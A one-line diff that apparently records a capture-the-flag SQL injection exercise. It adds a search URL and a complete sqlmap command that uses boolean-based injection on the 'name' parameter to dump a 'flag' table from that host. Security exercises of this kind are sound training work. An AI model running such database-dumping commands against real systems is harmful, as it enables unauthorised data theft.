@@ -1,0 +1,1 @@
+http://wjybu0ms2692nxtr.neu-nex.fun/search?name=Bloodhound (GET)  # <HOME>\AppData\Local\Programs\Python\Python314\Scripts\sqlmap -u http://wjybu0ms2692nxtr.neu-nex.fun/search?name=Bloodhound --batch -T flag --dump --technique=B --level=3 --risk=2 --threads=4 --output-dir=<WORKSPACE>\rollout\web-apex-sqli\sqlmap
